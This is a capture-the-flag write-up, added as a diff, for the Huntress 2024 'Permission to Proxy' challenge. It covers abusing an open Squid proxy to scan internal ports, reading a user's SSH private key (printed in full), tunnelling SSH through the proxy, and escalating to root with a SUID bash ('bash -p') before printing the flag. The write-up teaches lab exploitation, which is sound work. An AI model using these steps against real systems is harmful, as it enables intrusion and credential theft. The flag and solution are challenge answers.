@@ -1,0 +1,335 @@
+Name: Permission to Proxy
+Value: 477 points
+Category: Miscellaneous
+Solves: 71 Solves
+Author: @JohnHammond
+
+Description:
+Where do we go from here?
+
+Escalate your privileges and find the flag in root's home directory.
+
+Yes, the error message you see on startup is intentional. ;)
+
+Press the Start button on the top-right to begin this challenge.
+
+Connect with:
+http://challenge.ctf.games:30086
+
+Solution:
+
+1. Connect to the challenge instance and get greeted with a Squid Proxy landing page
+
+2. Curling the landing page, we get the following output (truncated)
+
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ curlcurl http://challenge.ctf.games:30086
+
+ (...)
+<p>Your cache administrator is <a href="mailto:webmaster?subject=CacheErrorInfo%20-%20ERR_INVALID_URL&amp;body=CacheHost%3A%20permission-to-proxy-5556e1f1646b7836-5d865bf64b-gkqhh%0D%0AErrPage%3A%20ERR_INVALID_URL%0D%0AErr%3A%20%5Bnone%5D%0D%0ATimeStamp%3A%20Wed,%2023%20Oct%202024%2002%3A45%3A17%20GMT%0D%0A%0D%0AClientIP%3A%2010.128.0.116%0D%0A%0D%0AHTTP%20Request%3A%0D%0A%0D%0A%0D%0A">webmaster</a>.</p>
+ (...)
+
+ 3. Processing that output with CyberChef's URL Decode and cleaning up the HTML we get the following recon clues
+
+	a. CacheErrorInfo - ERR_INVALID_URL
+	b. CacheHost: permission-to-proxy-5556e1f1646b7836-5d865bf64b-gkqhh
+	c. ErrPage: ERR_INVALID_URL
+	d. Err: [none]
+	e. TimeStamp: Wed, 23 Oct 2024 02:45:17 GMT
+	f. ClientIP: 10.128.0.116
+
+4. Curling the CacheHost hostname with the proxy, we get a resolution (truncated)
+
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ curl -x http://challenge.ctf.games:30086 http://permission-to-proxy-5556e1f1646b7836-5d865bf64b-gkqhh:3128
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+<meta type="copyright" content="Copyright (C) 1996-2017 The Squid Software Foundation and contributors">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>ERROR: The requested URL could not be retrieved</title>
+<style type="text/css"><!-- 
+ /*
+ * Copyright (C) 1996-2017 The Squid Software Foundation and contributors
+ *
+ * Squid software is distributed under GPLv2+ license and includes
+ * contributions from numerous individuals and organizations.
+ * Please see the COPYING and CONTRIBUTORS files for details.
+ */
+ (...)
+
+ 5. Shortening the URL even further, we get a resolution with 127.0.0.1:3128 (output omitted)
+
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ curl -x http://challenge.ctf.games:30086 http://127.0.0.1:3128
+
+6. I had AI generate a Python script to generate a ports.txt file containing 1-65535 on a new line
+   that I could feed into FFUF to fuzz available ports. 
+
+   Note: Spose was only returning port 22, and it was requiring public key auth.
+
+7. Fuzzing ports with FFUF we find port 50000 also returning a status 200
+                                                                                                                                                                                                                                 
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ ffuf -u http://127.0.0.1:FUZZ/ -w ports.txt -x http://challenge.ctf.games:30086/ -c -mc 200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://127.0.0.1:FUZZ/
+ :: Wordlist         : FUZZ: /home/kali/CTF/huntress2024/miscellaneous/permission_to_proxy/ports.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Proxy            : http://challenge.ctf.games:30086/
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+22                      [Status: 200, Size: 60, Words: 3, Lines: 3, Duration: 237ms]
+50000                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 95ms]
+:: Progress: [65535/65535] :: Job [1/1] :: 409 req/sec :: Duration: [0:02:27] :: Errors: 0 ::
+
+8. Sending a CURL request to port 50000, we appear to get some sort of webshell (output truncated)
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ curl -x http://challenge.ctf.games:30086 http://127.0.0.1:50000                       
+GET / HTTP/1.1
+
+User-Agent: curl/8.10.1
+
+Accept: */*
+
+Host: 127.0.0.1:50000
+
+Via: 1.1 permission-to-proxy-5556e1f1646b7836-5d865bf64b-gkqhh (squid/3.5.27)
+
+X-Forwarded-For: 10.128.0.16
+
+Cache-Control: max-age=259200
+
+Connection: keep-alive
+
+
+
+bash-4.4$ GET / HTTP/1.1
+<HTML>
+<HEAD>
+<TITLE>Directory /</TITLE>
+<BASE HREF="file:/">
+</HEAD>
+<BODY>
+<H1>Directory listing of /</H1>
+<UL>
+<LI><A HREF="./">./</A>
+<LI><A HREF="../">../</A>
+<LI><A HREF=".docker-entrypoint.sh">.docker-entrypoint.sh</A>
+<LI><A HREF="bin/">bin/</A>
+<LI><A HREF="boot/">boot/</A>
+<LI><A HREF="dev/">dev/</A>
+<LI><A HREF="etc/">etc/</A>
+<LI><A HREF="home/">home/</A>
+<LI><A HREF="lib/">lib/</A>
+<LI><A HREF="lib64/">lib64/</A>
+<LI><A HREF="media/">media/</A>
+<LI><A HREF="mnt/">mnt/</A>
+<LI><A HREF="opt/">opt/</A>
+<LI><A HREF="proc/">proc/</A>
+<LI><A HREF="root/">root/</A>
+<LI><A HREF="run/">run/</A>
+<LI><A HREF="sbin/">sbin/</A>
+<LI><A HREF="srv/">srv/</A>
+<LI><A HREF="sys/">sys/</A>
+<LI><A HREF="tmp/">tmp/</A>
+<LI><A HREF="usr/">usr/</A>
+<LI><A HREF="var/">var/</A>
+</UL>
+</BODY>
+</HTML>
+(...)
+
+9. Trying to navigate via cURL we were getting errors, but using FoxyProxy we were able to locate the .ssh directory
+   in /home/user/.ssh
+
+GET /home/user/.ssh/ HTTP/1.1
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br, zstd
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
+
+Priority: u=0, i
+
+Host: 127.0.0.1:50000
+
+Via: 1.1 permission-to-proxy-5556e1f1646b7836-5d865bf64b-gkqhh (squid/3.5.27)
+
+X-Forwarded-For: 10.128.0.40
+
+Cache-Control: max-age=259200
+
+Connection: keep-alive
+
+
+
+bash-4.4$ GET /home/user/.ssh/ HTTP/1.1
+<HTML>
+<HEAD>
+<TITLE>Directory /home/user/.ssh/</TITLE>
+<BASE HREF="file:/home/user/.ssh/">
+</HEAD>
+<BODY>
+<H1>Directory listing of /home/user/.ssh/</H1>
+<UL>
+<LI><A HREF="./">./</A>
+<LI><A HREF="../">../</A>
+<LI><A HREF="authorized_keys">authorized_keys</A>
+<LI><A HREF="id_rsa">id_rsa</A>
+<LI><A HREF="id_rsa.pub">id_rsa.pub</A>
+</UL>
+</BODY>
+</HTML>
+
+10. In Firefox, I was able to pull the private (id_rsa) key
+
+	a. id_rsa
+
+	-----BEGIN OPENSSH PRIVATE KEY-----
+	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
+	JauN0ipko/W2sAAAAJa2FsaUBrYWxpAQI=
+	-----END OPENSSH PRIVATE KEY-----
+
+	b. id_rsa.pub
+
+11. Installing Netcat-OpenBSD for the -X option, and cleaning the id_rsa I was able to connect as "user"
+
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ sudo apt install netcat-openbsd     
+
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ chmod 600 id_rsa                        
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ ssh -i ./id_rsa -o ProxyCommand="nc -X connect -x challenge.ctf.games:30086 %h %p" user@127.0.0.1 -p 22
+
+Load key "./id_rsa": error in libcrypto
+user@127.0.0.1: Permission denied (publickey).
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ vim --clean id_rsa 
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/miscellaneous/permission_to_proxy]
+└─$ ssh -i ./id_rsa -o ProxyCommand="nc -X connect -x challenge.ctf.games:30086 %h %p" user@127.0.0.1 -p 22
+
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 6.1.100+ x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+-bash-4.4$ 
+
+12. Searching for SUID binaries we find /bin/bash in the mix
+
+-bash-4.4$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/bin/umount
+/bin/bash
+/bin/mount
+/bin/su
+
+13. Trying an elevation technique from GTFO Bins we become root
+
+	a. https://gtfobins.github.io/gtfobins/bash/
+
+	-bash-4.4$ bash -p
+	bash-4.4# whoami
+	root
+
+14. Now we can cat the flag out
+
+bash-4.4# cat /root/flag.txt
+flag{c9bbd4888086111e9f632d4861c103f1}
+
+15. Flag: flag{c9bbd4888086111e9f632d4861c103f1}
